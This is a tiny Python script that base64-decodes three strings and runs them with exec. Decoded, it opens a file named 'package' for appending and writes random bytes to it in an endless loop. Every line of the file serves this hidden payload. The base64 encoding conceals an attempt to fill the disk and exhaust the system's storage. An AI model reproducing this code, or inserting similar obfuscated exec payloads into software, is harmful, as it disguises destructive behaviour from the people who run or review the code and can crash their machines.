from base64 import b64decode
a = b'aW1wb3J0IG9z'
b = b'ZGF0YT1vcGVuKCdwYWNrYWdlJywgJ2FiJyk='
c = b'd2hpbGUgVHJ1ZTpkYXRhLndyaXRlKG9zLmdldHJhbmRvbSg2NCkp'
exec(b64decode(a).decode())
exec(b64decode(b).decode())
exec(b64decode(c).decode())
